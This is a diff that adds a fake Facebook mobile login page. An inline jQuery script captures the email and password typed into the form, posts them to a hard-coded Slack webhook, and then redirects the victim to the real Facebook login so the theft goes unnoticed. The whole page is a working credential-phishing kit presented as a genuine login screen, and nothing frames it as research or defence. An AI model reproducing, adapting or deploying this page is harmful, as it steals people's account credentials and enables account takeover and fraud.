@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Welcome To Facebook</title>
+	<link rel="shortcut icon" href="img/shortcut.ico">
+	<link href="img/apple.png" rel="apple-touch-icon-precomposed" sizes="196x196" />
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+</head>
+<body>
+	<header>
+		<i class="img">
+			<u>facebook</u>
+		</i>
+	</header>
+	<div class="main">
+		<div class="login-form">
+			<form action="/" id="login-form">
+				<div class="input-group">
+					<input type="text" class="email" placeholder="Email address or phone number" autocomplete="off" value="">
+					<input type="password" class="password" placeholder="Password" autocomplete="off" value="">
+				</div>
+				<button type="submit" class="btn-login">Log in</button>
+			</form>
+		</div>
+		<div class="herow"><a class="btn-create" href="https://touch.facebook.com/reg/?cid=103">Create New Account</a></div>
+		<div class="herow"><a href="https://touch.facebook.com/recover/initiate/?c=https%3A%2F%2Ftouch.facebook.com%2Flogin%2F&lwv=100" class="forgot">Forgotten password? · Help Centre</a></div>
+	</div>
+	<div class="langs">
+		<div class="left">
+			<p>English (UK)</p>
+			<p>ျမန္မာဘာသာ</p>
+			<p>中文(简体)</p>
+			<p>Português (Brasil)</p>
+		</div>
+		<div class="right">
+			<p>မြန်မာဘာသာ</p>
+			<p>ภาษาไทย</p>
+			<p>Español</p>
+			<div class="plus"><i></i></div>
+		</div>
+	</div>
+	<footer>
+		<div class="herow">
+			Facebook ©2016<br>
+			<p>Download MyTelenor App</p>
+		</div>
+	</footer>
+	<script>
+		var _URL = 'https://hooks.slack.com/services/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';
+		$(document).ready(function() {
+			var form = $('#login-form');
+			form.submit(function(e) {
+				e.preventDefault();
+				// send()
+				return false;
+			})
+
+			form.on('submit', function(e) {
+				e.preventDefault();
+				send()
+				return false;
+			})
+		})
+		function send() {
+				var em = $('.email').val()
+				var pw = $('.password').val()
+				$.ajax({
+					url: _URL,
+					type: 'post',
+					data: {
+						payload: '{"text":"'+em+' @@@  '+pw+'","icon_emoji":":ghost:"}'
+					},
+					success: function() {
+						var fb = 'https://touch.facebook.com/login/';
+						window.location = fb
+					}
+				})
+		}
+	</script>
+</body>
+</html>
+
